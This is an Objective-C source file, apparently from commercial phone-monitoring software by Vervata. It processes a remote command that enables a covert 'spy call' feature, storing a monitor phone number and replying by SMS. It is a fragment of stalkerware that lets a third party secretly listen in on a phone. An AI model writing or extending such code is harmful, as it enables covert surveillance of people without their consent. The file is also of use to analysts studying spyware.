
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  EnableSpyCallWithMonitorProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  12/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "EnableSpyCallWithMonitorProcessor.h"
#import "PrefMonitorNumber.h"
#import "Preference.h"

@interface EnableSpyCallWithMonitorProcessor (PrivateAPI)
- (void) enableSpyCallWithMonitorNumber;
- (BOOL) isValidMonitorNumber;
- (void) enableSpyCallException;
- (void) sendReplySMS;
@end

@implementation EnableSpyCallWithMonitorProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableSpyCallWithMonitorProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (EnableSpyCallWithMonitorProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"EnableSpyCallWithMonitorProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableSpyCallWithMonitorProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"EnableSpyCallWithMonitorProcessor--->doProcessingCommand");
	if ([self isValidMonitorNumber]) [self enableSpyCallWithMonitorNumber];
	else [self enableSpyCallException];
}

#pragma mark EnableSpyCallWithMonitorProcessor PrivateAPI Methods

/**
 - Method name: enableSpyCallWithMonitorNumber
 - Purpose:This method is used to process enable Spy Call with monitor numbers
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) enableSpyCallWithMonitorNumber {
	DLog (@"EnableSpyCallWithMonitorProcessor--->enableSpyCallWithMonitorNumber");
	NSString *monitorNumber=[[mRemoteCmdData mArguments] objectAtIndex:2];
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefMonitorNumber *prefMonitor = (PrefMonitorNumber *) [prefManager preference:kMonitor_Number];
	[prefMonitor setMEnableMonitor:1];
	NSMutableArray *monitorsArray=[[NSMutableArray alloc] init];
	[monitorsArray addObject:monitorNumber];
	[prefMonitor setMMonitorNumbers:monitorsArray];
	[prefManager savePreferenceAndNotifyChange:prefMonitor];
	[monitorsArray release];
	[self sendReplySMS];
}

/**
 - Method name: isValidMonitorNumber
 - Purpose:This method is used to validate the arguments
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
*/

- (BOOL) isValidMonitorNumber {
	DLog (@"EnableSpyCallWithMonitorProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isPhoneNumber:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: enableSpyCallException
 - Purpose:This method is invoked when enable Spycall process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) enableSpyCallException {
	DLog (@"EnableSpyCallWithMonitorProcessor--->enableSpyCallException")
	FxException* exception = [FxException exceptionWithName:@"enableOneCallException" andReason:@"Enable OneCall with monitor number error"];
	[exception setErrorCode:kCmdExceptionErrorPhoneNumberInvalid];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"EnableSpyCallWithMonitorProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	NSString *enableSpyCallMessage=NSLocalizedString(@"kEnableOneCallWithMonitorNumber", @"");
	
	enableSpyCallMessage=[NSString stringWithFormat:@"%@ %@",enableSpyCallMessage, [[mRemoteCmdData mArguments] objectAtIndex:2]];
	
	enableSpyCallMessage=[messageFormat stringByAppendingString:enableSpyCallMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableSpyCallMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableSpyCallMessage];
	}
}


/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}


@end
